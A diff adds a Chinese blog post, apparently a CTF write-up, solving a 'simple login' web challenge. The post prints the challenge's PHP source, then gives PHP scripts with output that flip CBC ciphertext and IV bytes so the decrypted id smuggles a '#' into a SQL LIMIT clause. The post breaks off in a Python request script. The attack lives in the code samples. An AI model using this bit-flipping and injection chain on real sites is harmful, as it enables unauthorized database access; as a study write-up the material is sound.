@@ -1,0 +1,628 @@
+<!DOCTYPE html>
+<html lang="zh-cmn-Hans" prefix="og: http://ogp.me/ns#" class="han-init">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <title>实验吧-简单登录(CBC) &mdash; Evil</title>
+    <link rel="stylesheet" href="http://localhost:4000/assets/vendor/primer-css/css/primer.css">
+    <link rel="stylesheet" href="http://localhost:4000/assets/vendor/primer-markdown/dist/user-content.min.css">
+    <link rel="stylesheet" href="http://localhost:4000/assets/vendor/octicons/octicons/octicons.css">
+    <link rel="stylesheet" href="http://localhost:4000/assets/css/components/collection.css">
+    <link rel="stylesheet" href="http://localhost:4000/assets/css/components/repo-card.css">
+    <link rel="stylesheet" href="http://localhost:4000/assets/css/sections/repo-list.css">
+    <link rel="stylesheet" href="http://localhost:4000/assets/css/sections/mini-repo-list.css">
+    <link rel="stylesheet" href="http://localhost:4000/assets/css/components/boxed-group.css">
+    <link rel="stylesheet" href="http://localhost:4000/assets/css/globals/common.css">
+    <link rel="stylesheet" href="http://localhost:4000/assets/vendor/share.js/dist/css/share.min.css">
+    <link rel="stylesheet" href="http://localhost:4000/assets/css/globals/responsive.css">
+    <link rel="stylesheet" href="http://localhost:4000/assets/css/posts/index.css">
+
+    <link rel="stylesheet" href="http://localhost:4000/assets/css/customize.css">
+    <!-- Latest compiled and minified CSS -->
+    
+
+    
+    <link rel="canonical" href="http://localhost:4000/2018/11/20/%E5%AE%9E%E9%AA%8C%E5%90%A7web/">
+    <link rel="alternate" type="application/atom+xml" title="Evil" href="http://localhost:4000/feed.xml">
+    
+    <link rel="shortcut icon" href="http://localhost:4000/images/favicon.ico" >
+    
+    <meta property="og:title" content="实验吧-简单登录(CBC)">
+      
+    <meta name="keywords" content="Web Security">
+    <meta name="og:keywords" content="Web Security">
+      
+    <meta name="description" content="实验吧上 Web 类型的题目，实验吧上的题目质量还是挺高的，简单登录不简单……">
+    <meta name="og:description" content="实验吧上 Web 类型的题目，实验吧上的题目质量还是挺高的，简单登录不简单……">
+      
+    
+    
+        
+    
+    <meta property="og:url" content="http://localhost:4000/2018/11/20/%E5%AE%9E%E9%AA%8C%E5%90%A7web/">
+    <meta property="og:site_name" content="Evil">
+    <meta property="og:type" content="article">
+    <meta property="og:locale" content="zh_CN" />
+    
+    <meta property="article:published_time" content="2018-11-20">
+    
+    <script src="http://localhost:4000/assets/vendor/jquery/dist/jquery.min.js"></script>
+    <script src="http://localhost:4000/assets/js/jquery-ui.js"></script>
+    <script src="http://localhost:4000/assets/js/main.js"></script>
+</head>
+<body class="" data-mz="">
+    <header class="site-header">
+        <div class="container">
+            <h1><a href="http://localhost:4000/" title="Evil"><span class="octicon octicon-hubot"></span> Evil</a></h1>
+            <button class="collapsed mobile-visible" type="button" onclick="toggleMenu();">
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+            </button>
+            <nav class="site-header-nav" role="navigation">
+                
+                <a href="http://localhost:4000/" class=" site-header-nav-item" target="" title="主页">主页</a>
+                
+                <a href="http://localhost:4000/archives/" class=" site-header-nav-item" target="" title="归档">归档</a>
+                
+                <a href="http://localhost:4000/tags/" class=" site-header-nav-item" target="" title="标签">标签</a>
+                
+                <a href="http://localhost:4000/links/" class=" site-header-nav-item" target="" title="链接">链接</a>
+                
+                <a href="http://localhost:4000/about/" class=" site-header-nav-item" target="" title="关于">关于</a>
+                
+            </nav>
+        </div>
+    </header>
+    <!-- / header -->
+
+    <section class="collection-head small geopattern" data-pattern-id="实验吧-简单登录(CBC)">
+<div class="container">
+  <div class="columns">
+    <div class="column three-fourths">
+      <div class="collection-title">
+        <h1 class="collection-header">实验吧-简单登录(CBC)</h1>
+        <div class="collection-info">
+          
+          <span class="meta-info">
+            <span class="octicon octicon-calendar"></span> 2018/11/20
+          </span>
+          
+          
+          <span class="meta-info">
+            <span class="octicon octicon-file-directory"></span>
+            <a href="http://localhost:4000/categories/CTF" title="CTF">CTF</a>
+          </span>
+          
+
+          
+          <span class="meta-info">
+            <span class="octicon octicon-tag"></span>
+            <a href="http://localhost:4000/tags/#CTF" title="CTF">CTF</a>
+          </span>
+          
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+</section>
+<!-- / .banner -->
+<section class="container content">
+<div class="columns">
+  <div class="column three-fourths" >
+    <article class="article-content markdown-body">
+    <p>实验吧上 Web 类型的题目，实验吧上的题目质量还是挺高的，简单登录不简单……</p>
+
+<!--more-->
+
+<h2 id="0x01-源码获取">0x01 源码获取</h2>
+
+<p>抓包看一下 <code class="highlighter-rouge">Cookie</code> 知道应该是 CBC 字节翻转的题目</p>
+
+<p>之前做过一道关于 <a href="https://pengyang.me/2018/09/19/CBC/">CBC 字节翻转的题目</a>，这里加深印象并且进行一次复习吧</p>
+
+<p>这时候应该想办法搞到源码，在 Mac 上我用<code class="highlighter-rouge">webdirscan</code> 进行扫描(在windows上可以使用<code class="highlighter-rouge">御剑</code>)，得到 <code class="highlighter-rouge">ctf5.shiyanbar.com/web/jiandan/test.php</code></p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">define</span><span class="p">(</span><span class="s2">"SECRET_KEY"</span><span class="p">,</span> <span class="s1">'***********'</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s2">"METHOD"</span><span class="p">,</span> <span class="s2">"aes-128-cbc"</span><span class="p">);</span>
+<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="k">include</span><span class="p">(</span><span class="s1">'conn.php'</span><span class="p">);</span>
+<span class="k">function</span> <span class="nf">sqliCheck</span><span class="p">(</span><span class="nv">$str</span><span class="p">){</span>
+	<span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/</span><span class="se">\\</span><span class="s2">\|,|-|#|=|~|union|like|procedure/i"</span><span class="p">,</span><span class="nv">$str</span><span class="p">)){</span>
+		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">function</span> <span class="nf">get_random_iv</span><span class="p">(){</span>
+    <span class="nv">$random_iv</span><span class="o">=</span><span class="s1">''</span><span class="p">;</span>
+    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="mi">16</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
+        <span class="nv">$random_iv</span><span class="o">.=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">255</span><span class="p">));</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$random_iv</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">function</span> <span class="nf">login</span><span class="p">(</span><span class="nv">$info</span><span class="p">){</span>
+	<span class="nv">$iv</span> <span class="o">=</span> <span class="nx">get_random_iv</span><span class="p">();</span>
+	<span class="nv">$plain</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$info</span><span class="p">);</span>
+    <span class="nv">$cipher</span> <span class="o">=</span> <span class="nb">openssl_encrypt</span><span class="p">(</span><span class="nv">$plain</span><span class="p">,</span> <span class="nx">METHOD</span><span class="p">,</span> <span class="nx">SECRET_KEY</span><span class="p">,</span> <span class="nx">OPENSSL_RAW_DATA</span><span class="p">,</span> <span class="nv">$iv</span><span class="p">);</span>
+    <span class="nb">setcookie</span><span class="p">(</span><span class="s2">"iv"</span><span class="p">,</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$iv</span><span class="p">));</span>
+    <span class="nb">setcookie</span><span class="p">(</span><span class="s2">"cipher"</span><span class="p">,</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$cipher</span><span class="p">));</span>
+<span class="p">}</span>
+<span class="k">function</span> <span class="nf">show_homepage</span><span class="p">(){</span>
+	<span class="k">global</span> <span class="nv">$link</span><span class="p">;</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'cipher'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'iv'</span><span class="p">])){</span>
+        <span class="nv">$cipher</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'cipher'</span><span class="p">]);</span>
+        <span class="nv">$iv</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">"iv"</span><span class="p">]);</span>
+        <span class="k">if</span><span class="p">(</span><span class="nv">$plain</span> <span class="o">=</span> <span class="nb">openssl_decrypt</span><span class="p">(</span><span class="nv">$cipher</span><span class="p">,</span> <span class="nx">METHOD</span><span class="p">,</span> <span class="nx">SECRET_KEY</span><span class="p">,</span> <span class="nx">OPENSSL_RAW_DATA</span><span class="p">,</span> <span class="nv">$iv</span><span class="p">)){</span>
+            <span class="nv">$info</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$plain</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">"&lt;p&gt;base64_decode('"</span><span class="o">.</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$plain</span><span class="p">)</span><span class="o">.</span><span class="s2">"') can't unserialize&lt;/p&gt;"</span><span class="p">);</span>
+            <span class="nv">$sql</span><span class="o">=</span><span class="s2">"select * from users limit "</span><span class="o">.</span><span class="nv">$info</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span><span class="o">.</span><span class="s2">",0"</span><span class="p">;</span>
+            <span class="nv">$result</span><span class="o">=</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span><span class="nv">$sql</span><span class="p">);</span>
+            
+            <span class="k">if</span><span class="p">(</span><span class="nx">mysqli_num_rows</span><span class="p">(</span><span class="nv">$result</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span>  <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="nx">mysqli_error</span><span class="p">(</span><span class="nv">$link</span><span class="p">))){</span>
+            	<span class="nv">$rows</span><span class="o">=</span><span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
+				<span class="k">echo</span> <span class="s1">'&lt;h1&gt;&lt;center&gt;Hello!'</span><span class="o">.</span><span class="nv">$rows</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span><span class="o">.</span><span class="s1">'&lt;/center&gt;&lt;/h1&gt;'</span><span class="p">;</span>
+			<span class="p">}</span>
+			<span class="k">else</span><span class="p">{</span>
+				<span class="k">echo</span> <span class="s1">'&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;'</span><span class="p">;</span>
+			<span class="p">}</span>
+        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+            <span class="k">die</span><span class="p">(</span><span class="s2">"ERROR!"</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">])){</span>
+    <span class="nv">$id</span> <span class="o">=</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">];</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">sqliCheck</span><span class="p">(</span><span class="nv">$id</span><span class="p">))</span>
+		<span class="k">die</span><span class="p">(</span><span class="s2">"&lt;h1 style='color:red'&gt;&lt;center&gt;sql inject detected!&lt;/center&gt;&lt;/h1&gt;"</span><span class="p">);</span>
+    <span class="nv">$info</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'id'</span><span class="o">=&gt;</span><span class="nv">$id</span><span class="p">);</span>
+    <span class="nx">login</span><span class="p">(</span><span class="nv">$info</span><span class="p">);</span>
+    <span class="k">echo</span> <span class="s1">'&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;'</span><span class="p">;</span>
+<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">"iv"</span><span class="p">])</span><span class="o">&amp;&amp;</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'cipher'</span><span class="p">])){</span>
+        <span class="nx">show_homepage</span><span class="p">();</span>
+    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+        <span class="k">echo</span> <span class="s1">'&lt;body class="login-body" style="margin:0 auto"&gt;
+                &lt;div id="wrapper" style="margin:0 auto;width:800px;"&gt;
+                    &lt;form name="login-form" class="login-form" action="" method="post"&gt;
+                        &lt;div class="header"&gt;
+                        &lt;h1&gt;Login Form&lt;/h1&gt;
+                        &lt;span&gt;input id to login&lt;/span&gt;
+                        &lt;/div&gt;
+                        &lt;div class="content"&gt;
+                        &lt;input name="id" type="text" class="input id" value="id" onfocus="this.value=\'\'" /&gt;
+                        &lt;/div&gt;
+                        &lt;div class="footer"&gt;
+                        &lt;p&gt;&lt;input type="submit" name="submit" value="Login" class="button" /&gt;&lt;/p&gt;
+                        &lt;/div&gt;
+                    &lt;/form&gt;
+                &lt;/div&gt;
+            &lt;/body&gt;'</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="0x02--看个例子">0x02  看个例子</h2>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">'MY_AES_KEY'</span><span class="p">,</span> <span class="s2">"abcdef0123456789"</span><span class="p">);</span>
+<span class="k">function</span> <span class="nf">aes</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$encrypt</span><span class="p">,</span><span class="nv">$iv</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$aes</span> <span class="o">=</span> <span class="nb">mcrypt_module_open</span><span class="p">(</span><span class="nx">MCRYPT_RIJNDAEL_128</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nx">MCRYPT_MODE_CBC</span><span class="p">,</span> <span class="s1">''</span><span class="p">);</span>
+    <span class="nb">mcrypt_generic_init</span><span class="p">(</span><span class="nv">$aes</span><span class="p">,</span> <span class="nx">MY_AES_KEY</span><span class="p">,</span> <span class="nv">$iv</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nv">$encrypt</span> <span class="o">?</span> <span class="nb">mcrypt_generic</span><span class="p">(</span><span class="nv">$aes</span><span class="p">,</span><span class="nv">$data</span><span class="p">)</span> <span class="o">:</span> <span class="nb">mdecrypt_generic</span><span class="p">(</span><span class="nv">$aes</span><span class="p">,</span><span class="nv">$data</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="nb">define</span><span class="p">(</span><span class="s1">'MY_MAC_LEN'</span><span class="p">,</span> <span class="mi">40</span><span class="p">);</span>
+
+<span class="k">function</span> <span class="nf">encrypt</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span><span class="nv">$iv</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nx">aes</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="kc">true</span><span class="p">,</span><span class="nv">$iv</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">decrypt</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span><span class="nv">$iv</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">rtrim</span><span class="p">(</span><span class="nx">aes</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="kc">false</span><span class="p">,</span><span class="nv">$iv</span><span class="p">),</span> <span class="s2">"</span><span class="se">\0</span><span class="s2">"</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="nv">$v</span> <span class="o">=</span> <span class="s2">"a:2:{s:4:</span><span class="se">\"</span><span class="s2">name</span><span class="se">\"</span><span class="s2">;s:6:</span><span class="se">\"</span><span class="s2">sdsdsd</span><span class="se">\"</span><span class="s2">;s:8:</span><span class="se">\"</span><span class="s2">greeting</span><span class="se">\"</span><span class="s2">;s:20:</span><span class="se">\"</span><span class="s2">echo 'Hello sdsdsd!'</span><span class="se">\"</span><span class="s2">;}"</span><span class="p">;</span>
+<span class="k">echo</span> <span class="s2">"Plaintext before attack: </span><span class="nv">$v</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="nv">$b</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+<span class="nv">$enc</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+<span class="nv">$enc</span> <span class="o">=</span> <span class="o">@</span><span class="nx">encrypt</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span><span class="s2">"1234567891234567"</span><span class="p">);</span>
+<span class="k">echo</span> <span class="nb">ord</span><span class="p">(</span><span class="nv">$enc</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
+<span class="nv">$enc</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span>  <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$enc</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="s2">"6"</span><span class="p">)</span> <span class="o">^</span> <span class="nb">ord</span> <span class="p">(</span><span class="s2">"7"</span><span class="p">));</span>
+<span class="nv">$b</span> <span class="o">=</span> <span class="o">@</span><span class="nx">decrypt</span><span class="p">(</span><span class="nv">$enc</span><span class="p">,</span><span class="s2">"1234567891234567"</span><span class="p">);</span>
+<span class="k">echo</span> <span class="s2">"Plaintext AFTER attack : </span><span class="nv">$b</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>确保你的 PHP 版本有 <code class="highlighter-rouge">mcrypt</code> 扩展，没有的话，我这里为了方便起见在线运行上面 PHP 代码的</p>
+
+<p>输出</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Plaintext before attack: a:2:{s:4:"name";s:6:"sdsdsd";s:8:"greeting";s:20:"echo 'Hello sdsdsd!'";}
+254
+Plaintext AFTER attack : �1��îqv��C�fs:7:"sdsdsd";s:8:"greeting";s:20:"echo 'Hello sdsdsd!'";}
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">6</code> 变成了 <code class="highlighter-rouge">7</code> ，但是前面出现了乱码</p>
+
+<p>下面要做的就是修改 <code class="highlighter-rouge">iv</code> 使得第一块明文不会乱码</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$iv</span><span class="o">=</span><span class="s2">"1234567891234567"</span><span class="p">;</span>
+<span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="mi">16</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="nv">$iv</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$iv</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="nv">$b</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="nv">$v</span><span class="p">[</span><span class="nv">$i</span><span class="p">]));</span>
+<span class="c1">//iv = iv^明文^我们想要变成的
+</span><span class="p">}</span>
+<span class="nv">$c</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+<span class="nv">$c</span> <span class="o">=</span> <span class="o">@</span><span class="nx">decrypt</span><span class="p">(</span><span class="nv">$enc</span><span class="p">,</span><span class="nv">$iv</span><span class="p">);</span>
+<span class="k">echo</span> <span class="s2">"Plaintext Third attack : </span><span class="nv">$c</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>输出</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Plaintext before attack: a:2:{s:4:"name";s:6:"sdsdsd";s:8:"greeting";s:20:"echo 'Hello sdsdsd!'";}
+254
+Plaintext AFTER attack : �1��îqv��C�fs:7:"sdsdsd";s:8:"greeting";s:20:"echo 'Hello sdsdsd!'";}
+Plaintext Third attack : a:2:{s:4:"name";s:7:"sdsdsd";s:8:"greeting";s:20:"echo 'Hello sdsdsd!'";}
+</code></pre></div></div>
+
+<h2 id="0x03-解答">0x03 解答</h2>
+
+<p><strong>对于CBC字节翻转的题目完全可以按照固定的套路来</strong></p>
+
+<h3 id="step1-查看关键点">step1 查看关键点</h3>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">])){</span>
+    <span class="nv">$id</span> <span class="o">=</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">];</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">sqliCheck</span><span class="p">(</span><span class="nv">$id</span><span class="p">))</span>
+		<span class="k">die</span><span class="p">(</span><span class="s2">"&lt;h1 style='color:red'&gt;&lt;center&gt;sql inject detected!&lt;/center&gt;&lt;/h1&gt;"</span><span class="p">);</span>
+    <span class="nv">$info</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'id'</span><span class="o">=&gt;</span><span class="nv">$id</span><span class="p">);</span>
+    <span class="nx">login</span><span class="p">(</span><span class="nv">$info</span><span class="p">);</span>
+    <span class="k">echo</span> <span class="s1">'&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;'</span><span class="p">;</span>
+<span class="p">}</span>
+
+ <span class="nv">$sql</span><span class="o">=</span><span class="s2">"select * from users limit "</span><span class="o">.</span><span class="nv">$info</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span><span class="o">.</span><span class="s2">",0"</span><span class="p">;</span>
+</code></pre></div></div>
+
+<h3 id="step2-修改-cipher">step2 修改 cipher</h3>
+
+<p>16个byte为一组，进行分组： 
+BLOCK#1:<code class="highlighter-rouge">a:1:{s:2:"id";s:</code> 
+BLOCK#2:<code class="highlighter-rouge">2:"12";}</code> 
+我们先修改cipher中的BLOCK#1的密文，使得BLOCK#2的解密后结果为<code class="highlighter-rouge">2:"1#";}</code>，这样就能够使用<code class="highlighter-rouge">#</code>注释掉<code class="highlighter-rouge">,0</code>了。</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$cipher</span><span class="o">=</span><span class="s2">"cX0NHaSdDATVKDPUwRlh4TsIsoD9rqQ%2B1X0PDvOG4g8%3D"</span><span class="p">;</span>
+<span class="nv">$cipher</span><span class="o">=</span><span class="nb">urldecode</span><span class="p">(</span><span class="nv">$cipher</span><span class="p">);</span>
+<span class="nv">$cipher</span><span class="o">=</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$cipher</span><span class="p">);</span>
+<span class="nv">$cipher</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$cipher</span><span class="p">[</span><span class="mi">4</span><span class="p">])</span><span class="o">^</span><span class="nb">ord</span><span class="p">(</span><span class="s1">'2'</span><span class="p">)</span><span class="o">^</span><span class="nb">ord</span><span class="p">(</span><span class="s1">'#'</span><span class="p">));</span>
+<span class="nv">$cipher</span><span class="o">=</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$cipher</span><span class="p">);</span>
+<span class="nv">$cipher</span><span class="o">=</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$cipher</span><span class="p">);</span>
+<span class="k">echo</span> <span class="s2">"</span><span class="nv">$cipher</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="c1">//cX0NHbWdDATVKDPUwRlh4TsIsoD9rqQ%2B1X0PDvOG4g8%3D
+</span><span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>将上面修改后的 cipher 提交，会获得第一块乱码的数据</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>base64_decode('nITbSnte/q81Kq4j9wyAMTI6IjEjIjt9') can't unserialize
+</code></pre></div></div>
+
+<h3 id="step3--修改-iv">step3  修改 iv</h3>
+
+<p>现在我们知道了乱码明文的base64值，以及原本正常的明文值： 
+<code class="highlighter-rouge">IV_After_Modified = IV XOR BLOCK_Wrong_#1 XOR BLOCK#1</code> 
+修改IV即可：</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$iv</span> <span class="o">=</span> <span class="s2">"PyJhMDfdX94QnNn7YxgqAg%3D%3D"</span><span class="p">;</span>
+<span class="nv">$iv</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$iv</span><span class="p">);</span>
+<span class="nv">$iv</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$iv</span><span class="p">);</span>
+<span class="nv">$block_wrong</span><span class="o">=</span><span class="s2">"nITbSnte/q81Kq4j9wyAMTI6IjEjIjt9"</span><span class="p">;</span>
+<span class="nv">$block_wrong</span><span class="o">=</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$block_wrong</span><span class="p">);</span>
+<span class="nv">$block_right</span><span class="o">=</span><span class="s2">"a:1:{s:2:</span><span class="se">\"</span><span class="s2">id</span><span class="se">\"</span><span class="s2">;s:"</span><span class="p">;</span>
+<span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="mi">16</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="nv">$iv</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$block_wrong</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="nv">$iv</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="nv">$block_right</span><span class="p">[</span><span class="nv">$i</span><span class="p">]));</span>
+<span class="p">}</span>
+<span class="nv">$iv</span><span class="o">=</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$iv</span><span class="p">);</span>
+<span class="nv">$iv</span><span class="o">=</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$iv</span><span class="p">);</span>
+<span class="k">echo</span> <span class="s2">"</span><span class="nv">$iv</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="c1">//wpyLQDfwm0MflB68ti%2FZCQ%3D%3D
+</span><span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>将上面修改后的 <code class="highlighter-rouge">iv</code> 提交，会得到</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Hello!rootzz
+</code></pre></div></div>
+
+<p>可以看到我们已经注入成功</p>
+
+<h2 id="0x04-获取-flag">0x04 获取 flag</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">urllib</span> <span class="kn">import</span> <span class="n">quote</span><span class="p">,</span><span class="n">unquote</span>
+
+<span class="n">url</span><span class="o">=</span><span class="s">"http://ctf5.shiyanbar.com/web/jiandan/index.php"</span>
+
+<span class="k">def</span> <span class="nf">find_flag</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span><span class="n">cbc_flip_index</span><span class="p">,</span><span class="n">char_in_payload</span><span class="p">,</span><span class="n">char_to_replace</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s">"id"</span><span class="p">:</span><span class="n">payload</span><span class="p">}</span>
+    <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
